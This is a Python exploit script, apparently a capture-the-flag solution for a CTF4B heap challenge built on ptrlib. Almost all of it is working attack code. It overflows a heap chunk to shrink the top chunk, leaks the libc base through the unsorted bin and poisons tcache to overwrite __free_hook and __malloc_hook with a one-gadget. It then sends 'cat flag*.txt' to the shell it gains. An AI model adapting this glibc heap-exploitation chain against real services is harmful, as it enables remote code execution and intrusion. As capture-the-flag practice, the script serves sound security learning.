from ptrlib import *
import os

PORT = os.getenv("CTF4B_PORT", "9999")
HOST = os.getenv("CTF4B_HOST", "localhost")

def new(index, size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
def edit(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", data)
def show(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    return sock.recvlineafter(": ")

libc = ELF("./libc-2.31.so")
sock = Socket(HOST, int(PORT))

# shrink top
new(0, 0x18)
edit(0, b'A' * 0x18 + p64(0xd51))
new(1, 0xd48) # link to unsortedbin

# leak libc
edit(0, b'A' * 0x20)
libc_base = u64(show(0)[0x20:]) - libc.main_arena() - 0x60
logger.info("libc = " + hex(libc_base))
libc.set_base(libc_base)
edit(0, b'A' * 0x18 + p64(0xd31))
new(2, 0xd18) # consume unsortedbin

# shrink top
edit(1, b'B' * 0xd48 + p64(0x2b1))
new(3, 0x2a8) # link to tcache

# shrink top
new(4, 0xa98)
edit(4, b'C' * 0xa98 + p64(0x2b1))
new(5, 0x2a8) # link to tcache

# tcache poisoning
payload  = b'C' * 0xa98 + p64(0x291)
payload += p64(libc.symbol('__free_hook'))
edit(4, payload)
new(6, 0x288)
new(7, 0x288)
edit(7, p64(libc_base + 0x54f89))

# shrink top
new(8, 0xa98)
edit(8, b'D' * 0xa98 + p64(0x2b1))
new(9, 0x2a8) # link to tcache

# shrink top
new(10, 0xa98)
edit(10, b'E' * 0xa98 + p64(0x2b1))
new(11, 0x2a8) # link to tcache

# tcache poisoning
payload  = b'F' * 0xa98 + p64(0x291)
payload += p64(libc.symbol('__malloc_hook'))
edit(10, payload)
new(12, 0x288)
new(13, 0x288)
edit(13, p64(libc.symbol('free') + 8))

# win
new(14, 0x18)

sock.sendline("cat flag*.txt")
print(sock.recvline().decode())
